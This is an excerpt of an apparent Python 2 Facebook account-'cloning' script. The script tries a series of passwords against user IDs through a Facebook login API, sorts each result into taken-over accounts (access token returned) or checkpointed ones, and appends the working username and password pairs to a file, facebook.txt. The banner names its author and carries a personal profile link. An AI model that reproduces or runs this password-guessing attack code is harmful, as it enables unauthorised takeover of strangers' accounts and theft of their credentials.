# MY TELEGRAM CHANNEL @facebook
# MY TELEGRAM GROUP @ Tar Max Komand 
#MY GITHUB HTTPS://GITHUB.COM/facebook
#THIS SCRIPT FREE 
...
facebook_youtube = random.choice(["https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA"])

youtuber = facebook_youtube
...
\033[1;97m               ─────────────•◈•──────────\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : facebook
\033[1;91m GitHub      : facebook
\033[1;91m YouTube     : facebook
\033[1;91m Telegram CH   : https://www.facebook.com/asadullah.shirzad.56
\033[1;91m TLEGRAM GP    : facebook
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[facebook_OK] ' + k + c + user + ' | ' + pass1
                okb = open('facebook.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[facebook_CP] ' + k + c + user + ' | ' + pass1
                cps = open('facebook.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[facebook_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('facebook.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[facebook_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('facebook.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[facebook_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('facebook.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[facebook_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('facebook.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[facebook_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('facebook.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[facebook_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('facebook.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[facebook_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('facebook.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[facebook_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('facebook.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : facebook.txt'
